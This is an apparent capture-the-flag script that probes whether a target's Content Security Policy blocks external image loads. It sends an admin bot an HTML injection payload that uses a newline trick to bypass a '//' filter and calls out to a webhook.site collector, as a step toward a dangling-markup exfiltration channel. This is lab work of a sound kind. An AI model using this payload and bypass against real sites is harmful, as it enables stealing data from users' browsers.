"""
Test whether CSP actually blocks external <img> loads on the live instance.
We inject a clean <img> (no dangling markup) and check if webhook receives a hit.
If yes -> CSP is NOT enforced -> dangling markup URL was just malformed.
If no  -> CSP IS enforced -> need a different exfil channel.
"""
import requests
import urllib.parse
import time
import urllib3
import re

urllib3.disable_warnings()

BOT = "https://bot-9cf8d8cc310eff6b.chal.ctf.ae"
WEBHOOK_UUID = "c7e8f703-1ee1-417a-921e-68c113778ff6"
WEBHOOK_API  = f"https://webhook.site/token/{WEBHOOK_UUID}/requests"

# Clean <img> with no dangling markup - just test if external img loads at all
# Use /\n/ to bypass the // filter
# The newline is stripped by the browser URL parser -> //webhook.site/...
clean_payload = '<img src="/\n/webhook.site/' + WEBHOOK_UUID + '/csp_test">'
print("[*] Payload (repr):", repr(clean_payload))

report_url = "http://127.0.0.1:3000/?content=" + urllib.parse.quote(clean_payload, safe='')
print("[*] Report URL:", report_url)

# Count existing webhook hits before test
r0 = requests.get(WEBHOOK_API)
before_count = r0.json().get('total', 0)
print(f"[*] Webhook hits before test: {before_count}")

# Send report
print("[*] Sending report to bot... (will take ~23s)")
t0 = time.time()
r = requests.post(f"{BOT}/api/report", json={"url": report_url}, verify=False, timeout=40)
elapsed = round(time.time() - t0, 2)
print(f"[*] Bot returned status {r.status_code} in {elapsed}s")

# Check webhook for new hits
time.sleep(2)
r1 = requests.get(WEBHOOK_API)
after_count = r1.json().get('total', 0)
print(f"[*] Webhook hits after test: {after_count}")

new_hits = after_count - before_count
if new_hits > 0:
    print("[+] CSP is NOT enforced! External <img> fired!")
    for req in r1.json().get('data', []):
        url = req.get('url', '')
        if 'csp_test' in url:
            print(f"    Hit: {url}")
else:
    print("[-] CSP IS enforced. No external <img> hit received.")
    print("    Need alternative exfiltration channel.")
